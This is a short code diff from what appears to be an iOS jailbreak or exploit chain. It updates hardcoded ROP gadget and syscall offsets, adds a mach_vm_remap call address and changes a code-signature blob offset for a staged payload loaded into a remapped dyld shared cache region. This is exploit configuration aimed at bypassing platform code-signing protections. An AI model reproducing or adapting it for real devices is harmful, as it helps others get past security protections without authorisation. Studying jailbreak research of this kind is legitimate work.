@@ -36,6 +36,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.cbz_x0_x16_load = 0x1b0a9ad30; // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
 	myoffsets.add_x0_gadget = 0x184f6992c; // raw byte search again (gadget is in rop.h)
 	myoffsets.fcntl_raw_syscall = 0x180978490; // raw bytes again (because it's a mov x16, <imm>, svc and that can't change)
+	myoffsets.raw_mach_vm_remap_call = 0x180966484;
 	myoffsets.rop_nop = 0x180a8181c; // just use the longjmp gadget above and search the ret instruction
 	myoffsets.new_cache_addr = 0x1c0000000; 
 	myoffsets.cache_text_seg_size = 0x30000000; // we can get that by parsing the segements from the cache
@@ -55,7 +56,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000;
 	myoffsets.stage3_size = 0x10000; // get the file size and round at page boundry
 	myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + 0x5c24; // nm of the function we want to jump to
-	myoffsets.stage3_CS_blob = 49712; // jtool --sig shows that info and I think we can get it when parsing the header
+	myoffsets.stage3_CS_blob = 49744; // jtool --sig shows that info and I think we can get it when parsing the header
 	myoffsets.stage3_CS_blob_size = 624; // same for this one
 
 	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
